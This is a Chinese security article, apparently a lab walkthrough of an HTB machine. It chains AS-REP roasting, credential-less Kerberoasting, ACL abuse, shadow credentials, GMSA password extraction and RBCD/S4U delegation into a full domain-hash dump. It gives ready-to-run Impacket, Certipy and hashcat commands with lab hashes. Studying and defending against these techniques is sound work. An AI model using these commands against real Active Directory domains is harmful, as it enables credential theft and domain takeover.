---
title: 攻破Active Directory：Kerberos委派与RBCD滥用实战
url: https://mp.weixin.qq.com/s/M00iXDer0Vr4hDvPY2Thfw
source: Doonsec's feed
date: 2026-02-28
fetch_date: 2026-03-01T04:26:44.215341
---

# 攻破Active Directory：Kerberos委派与RBCD滥用实战

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/KysoJFiczHUsUq6arnnOuwnBNrDkeG1YbAPDHNoeRtGCtb9y4sBzSTtMLo2rw6ibDuxkrKwAiazsPrzVr8ib1lnTYEmjkia2g2qxuExicDobtU83s/0?wx_fmt=jpeg)

# 攻破Active Directory：Kerberos委派与RBCD滥用实战

柠檬赏金猎人

![]()

在小说阅读器中沉浸阅读

### 概述

综合利用RID循环攻击、AS-REP Roasting、Kerberoasting、ACL滥用、影子凭证、GMSA密码提取、约束委派和基于资源的约束委派（RBCD）等多种技术，最终获取域管理员权限。整个攻击链展示了现代AD环境中常见的安全配置问题和攻击面。

![](https://mmbiz.qpic.cn/mmbiz_jpg/KysoJFiczHUsnDPViahCnjl3YlkVMicRrcEPLFd2cib3Nicxicna9OlaxbzPu8w4AVXMhmH3r1dllWRdmgn27LkOFhNBiaCmff1fnEJIv2uFymEGfk/640?wx_fmt=jpeg)

### 技术/功能

**核心攻击技术：**

1. **信息收集与用户枚举**

   * **RID循环攻击**：通过SMB空会话（guest）枚举域用户和组。
   * **端口扫描**：识别域控制器标准端口（LDAP, Kerberos, SMB等）。
2. **初始访问**

   * **AS-REP Roasting**：利用用户`jjones`设置的`DONT_REQUIRE_PREAUTH`属性，获取其Kerberos AS-REP哈希。
   * **无凭证Kerberoasting**：滥用`jjones`的预认证绕过属性，为其他服务账户（如`ldap_monitor`）请求TGS票据并离线破解。
3. **横向移动与权限提升**

   * **密码喷洒**：发现`ldap_monitor`与`oorend`共享密码。
   * **ACL分析与滥用**：
     + 发现`oorend`对`ServiceMgmt`组拥有`Self`权限，可将自身添加到该组。
     + `ServiceMgmt`组对`Service Users` OU拥有`GenericAll`权限，从而`oorend`可以控制该OU内的用户（如`winrm_svc`）。
   * **接管目标账户**：
     + **方法一（密码重置）**：直接修改`winrm_svc`用户的密码。
     + **方法二（影子凭证）**：使用Certipy为`winrm_svc`添加影子凭证（Key Credential），获取其NTLM哈希，更为隐蔽。
   * **跨会话中继攻击**：利用`TBrady`用户已登录的会话，通过`RemotePotato0`或`KrbRelay`工具触发其NTLM认证并中继/捕获哈希，随后破解获得明文密码。
4. **关键信息获取**

   * **GMSA密码读取**：`TBrady`对`delegator$`（GMSA账户）拥有`ReadGMSAPassword`权限。使用`bloodyAD`、`GMSAPasswordReader`或`netexec`提取其NTLM哈希。
5. **委派滥用与域控妥协**

   * **约束委派分析**：发现`delegator$`账户被配置为对`DC01$`的`HTTP`服务进行约束委派。
   * **基于资源的约束委派（RBCD）设置**：利用`delegator$`的哈希，通过`rbcd.py`将`ldap_monitor`设置为`delegator$`的受信任委派主体。
   * **S4U2Self + S4U2Proxy链**：
     1. 以`ldap_monitor`身份，通过S4U2Self和S4U2Proxy，模拟`DC01$`机器账户获取一个访问`delegator$`服务（`browser/dc01.rebound.htb`）的**可转发**票据。
     2. 以`delegator$`身份，使用上一步获得的可转发票据，结合其原有的约束委派权限，通过S4U2Proxy为`DC01$`机器账户请求访问`DC01`的`HTTP`服务票据。
   * **哈希转储**：使用最终获得的`DC01$`机器账户票据，通过`secretsdump.py`的DRSUAPI方法转储整个域（NTDS.DIT）的NTLM哈希。
   * **域管理员访问**：使用管理员的NTLM哈希通过Evil-WinRM获得域控的完全控制权。

**涉及工具：**

* `nmap`、`netexec`、`lookupsid.py`
* `GetNPUsers.py`、`GetUserSPNs.py`
* `hashcat`
* `bloodhound-python`、`bloodyAD`、`powerview.py`
* `certipy`、`RunasCs.exe`
* `RemotePotato0`、`KrbRelay`
* `GMSAPasswordReader.exe`
* `rbcd.py`、`getST.py`、`secretsdump.py`
* `evil-winrm`

### 使用示例

**1. 无凭证Kerberoasting (AS-REP + Kerberoast组合)**

```
# 1. 枚举用户 (RID循环)
lookupsid.py -no-pass 'guest@rebound.htb' 8000 | grep SidTypeUser | cut -d' ' -f2 | cut -d'\' -f2 > users.txt

# 2. 发现无需预认证的用户
GetNPUsers.py -usersfile users.txt rebound.htb/ -dc-ip 10.10.11.231

# 3. 利用该用户进行Kerberoasting
GetUserSPNs.py -no-preauth jjones -usersfile users.txt -dc-host 10.10.11.231 rebound.htb/ | grep '^\$krb' > kerb_hashes.txt

# 4. 破解哈希
hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt
```

**2. 影子凭证攻击**

```
# 使用Certipy为受控用户添加影子凭证并获取哈希
certipy shadow auto -username oorend@rebound.htb -password 'Password123' -k -account winrm_svc -target dc01.rebound.htb
# 输出中包含目标用户的NTLM哈希
```

**3. 基于资源的约束委派 (RBCD) 攻击链**

```
# 1. 添加RBCD权限
rbcd.py 'rebound.htb/delegator$' -hashes :E1630B0E18242439A50E9D8B5F5B7524 -k -delegate-from ldap_monitor -delegate-to 'delegator$' -action write -dc-ip dc01.rebound.htb -use-ldaps

# 2. 获取可转发票据 (S4U2Self + S4U2Proxy)
getST.py 'rebound.htb/ldap_monitor:Password123' -spn browser/dc01.rebound.htb -impersonate DC01$
# 保存为票据缓存文件，例如 DC01\$@browser_dc01.rebound.htb@REBOUND.HTB.ccache

# 3. 利用约束委派获取DC机器账户票据
getST.py -spn http/dc01.rebound.htb -impersonate 'DC01$' 'rebound.htb/delegator$' -hashes :E1630B0E18242439A50E9D8B5F5B7524 -additional-ticket DC01\$@browser_dc01.rebound.htb@REBOUND.HTB.ccache
# 保存为新的票据缓存文件

# 4. 使用机器账户票据转储域哈希
export KRB5CCNAME='DC01$@http_dc01.rebound.htb@REBOUND.HTB.ccache'
secretsdump.py -no-pass -k dc01.rebound.htb -just-dc-ntlm
```

### 注意事项

1. **LDAP通道绑定**：目标域控制器强制要求LDAP通道绑定和签名。在使用LDAP相关工具（如`bloodhound-python`、`certipy find`、`netexec ldap`）时，可能需要添加`-k`（Kerberos）、`-scheme ldaps`或`--use-ldaps`参数，甚至安装特定补丁的`ldap3`库。
2. **票据与哈希**：Kerberos票据（`.ccache`）和NTLM哈希是不同形式的凭据，适用于不同的协议和工具。理解`getST.py`、`secretsdump.py`等工具何时使用`-k`（票据）或`-hashes`参数至关重要。
3. **清理与重置**：实验环境中可能存在自动化脚本重置某些配置（如RBCD）。如果攻击步骤中途失败，可能需要重新执行之前的设置步骤。
4. **主机名解析**：确保攻击机能够正确解析域控制器的主机名（如`dc01.rebound.htb`），将其添加到`/etc/hosts`文件，否则Kerberos认证可能失败。
5. **工具版本**：某些工具（如`bloodhound-python`的新版本）在数据收集时可能遇到错误，需要调整参数或使用旧版本。`GetUserSPNs.py`的无预认证Kerberoasting功能需要较新的Impacket版本。
6. **攻击路径多样性**：本机展示了多种达到同一目的的方法（如密码重置 vs. 影子凭证，RemotePotato0 vs. KrbRelay），理解其原理和优缺点有助于在实际场景中选择合适的技术。

### 参考链接

* https://www.semperis.com/blog/new-attack-paths-as-requested-sts/
* https://github.com/fortra/impacket
* https://github.com/aniqfakhrul/powerview.py
* https://github.com/CravateRouge/bloodyAD
* https://github.com/ly4k/Certipy
* https://github.com/antonioCoco/RemotePotato0
* https://github.com/cube0x0/KrbRelay
* https://github.com/rvazarkar/GMSAPasswordReader
* https://www.thehacker.recipes/a-d/movement/dacl/readgmsapassword
* https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-sfu/

---

仅限交流学习使用，如您在使用本工具或代码的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。“如侵权请私聊公众号删文”。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/OkRKg4J9smV0q1aJxxA7GF9uXFH0S6D3QRb0jNcE13icxpHvErdgibarS4mwYYE2aicga15MMmcOCdTazgj9ibn0RA/0?wx_fmt=png)

柠檬赏金猎人

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/OkRKg4J9smV0q1aJxxA7GF9uXFH0S6D3QRb0jNcE13icxpHvErdgibarS4mwYYE2aicga15MMmcOCdTazgj9ibn0RA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过